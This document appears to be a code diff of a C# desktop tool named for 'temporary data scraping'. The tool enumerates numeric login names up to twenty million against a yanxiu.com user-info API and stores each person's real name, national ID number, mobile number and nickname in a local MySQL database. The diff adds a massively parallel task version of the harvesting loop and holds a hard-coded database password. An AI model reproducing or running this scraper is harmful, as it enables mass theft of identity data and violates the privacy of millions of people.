@@ -224,6 +224,7 @@ namespace 临时数据抓取
             try
             {
                 string constr = "Host =localhost;Database=yanxiu_user;Username=root;Password=c#kaifa6668.";
+                //string constr = "Host =localhost;Database=yanxiu_user;Username=root;Password=root";
                 MySqlConnection mycon = new MySqlConnection(constr);
                 mycon.Open();
 
@@ -251,20 +252,19 @@ namespace 临时数据抓取
 
 
             List<int> lists = new List<int>();
+
         #region 研修网用户
 
         public void yanxiu(object o)
         {
 
-            string[] text =o.ToString().Split(new string[] { "," }, StringSplitOptions.None);
-            int start = Convert.ToInt32(text[0]);
-            int end = Convert.ToInt32(text[1]);
-            for (int i = start; i < end; i++)
+           
+            for (int i = 0; i < 20000000; i++)
             {
                 label1.Text = i.ToString();
                 try
-                {
-                 
+                    {
+
                         string url = "http://uc.yanxiu.com/ucn/platform/data.api?method=user.getUserInfoByLoginName&loginName=" + i;
 
                         string html = method.GetUrl(url, "utf-8");
@@ -277,7 +277,7 @@ namespace 临时数据抓取
                         if (card == "")
                             continue;
 
-                    insert(name,card,phone,i.ToString(),nickname,html);
+                        insert(name, card, phone, i.ToString(), nickname, html);
                         //ListViewItem lv1 = listView1.Items.Add(listView1.Items.Count.ToString()); //使用Listview展示数据
                         //lv1.SubItems.Add(name);
                         //lv1.SubItems.Add(card);
@@ -286,36 +286,78 @@ namespace 临时数据抓取
                         //lv1.SubItems.Add(nickname);
                         //lv1.SubItems.Add(html);
 
+                      
 
-
-                    while (this.zanting == false)
+                        while (this.zanting == false)
                         {
                             Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                         }
                         if (status == false)
                             return;
-                    
-                }
-                catch (Exception)
-                {
 
-                   continue;
-                }
+                    }
+                    catch (Exception)
+                    {
+
+                        continue;
+                    }
+                
                 
             }
 
-            richTextBox1.Text += "结束"+start+"----"+end+"\r\n";
-
+            
 
         }
 
         #endregion
 
-        
-        
-        
-        
-        
+
+        private void Test()
+        {
+
+         
+           textBox1.Text = "正在查询......";
+            List<Task> TaskList = new List<Task>();
+            for (int i = 0; i < 20000000; i++)
+            {
+               
+                    TaskList.Add(Task.Factory.StartNew(() =>
+                    {
+                        string url = "http://uc.yanxiu.com/ucn/platform/data.api?method=user.getUserInfoByLoginName&loginName=" + i;
+                        string html = method.GetUrl(url, "utf-8");
+                        string name = Regex.Match(html, @"""realName"":""([\s\S]*?)""").Groups[1].Value;
+                        string card = Regex.Match(html, @"""idCard"":""([\s\S]*?)""").Groups[1].Value;
+                        string phone = Regex.Match(html, @"""mobile"":""([\s\S]*?)""").Groups[1].Value;
+                        string nickname = Regex.Match(html, @"""nickName"":""([\s\S]*?)""").Groups[1].Value;
+
+                    // textBox1.Text = html;
+                    if (card != "")
+                        {
+                            BeginInvoke(new Action(() =>
+                            {
+                                insert(name, card, phone, i.ToString(), nickname, html);
+                                label1.Text = DateTime.Now.ToString() + "----" + i + "---插入成功";
+                            }));
+                        }
+                        else
+                        {
+                            BeginInvoke(new Action(() =>
+                            {
+
+                                label1.Text = DateTime.Now.ToString() + "----" + i + "---身份信息为空跳过";
+                            }));
+                        }
+                    }));
+                
+            }
+            Task.WaitAll(TaskList.ToArray());
+            MessageBox.Show("全部结束！", "提示");
+          
+        }
+
+
+
+
         Thread thread;
         bool status = true;
         bool zanting = true;
@@ -354,55 +396,19 @@ namespace 临时数据抓取
 
         private void button1_Click(object sender, EventArgs e)
         {
-            //if (thread == null || !thread.IsAlive)
-            //{
-            //    thread = new Thread(run);
-            //    thread.Start();
-            //    Control.CheckForIllegalCrossThreadCalls = false;
-            //}
+            if (thread == null || !thread.IsAlive)
+            {
+                thread = new Thread(yanxiu);
+                thread.Start();
+                Control.CheckForIllegalCrossThreadCalls = false;
+            }
 
 
 
 
-            Thread thread = new Thread(new ParameterizedThreadStart(yanxiu));
-            string o = "8000000,20000000";
-            thread.Start((object)o);
-            Control.CheckForIllegalCrossThreadCalls = false;
-
-            //Thread t1 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o1 = "1000000,2000000";
-            //t1.Start((object)o1);
-
-            //Thread t2 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o2 = "2000000,3000000";
-            //t2.Start((object)o2);
 
 
-            //Thread t3 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o3 = "3000000,4000000";
-            //t3.Start((object)o3);
 
-            //Thread t4 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o4 = "4000000,5000000";
-            //t4.Start((object)o4);
-
-
-            //Thread t5 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o5 = "5000000,6000000";
-            //t5.Start((object)o5);
-            //Thread t6 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o6 = "6000000,7000000";
-            //t6.Start((object)o6);
-            //Thread t7 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o7 = "7000000,8000000";
-            //t7.Start((object)o7);
-            //Thread t8 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o8 = "8000000,9000000";
-            //t8.Start((object)o8);
-            //Thread t9 = new Thread(new ParameterizedThreadStart(yanxiu));
-            //string o9 = "9000000,10000000";
-            //t9.Start((object)o9);
-           
 
 
         }
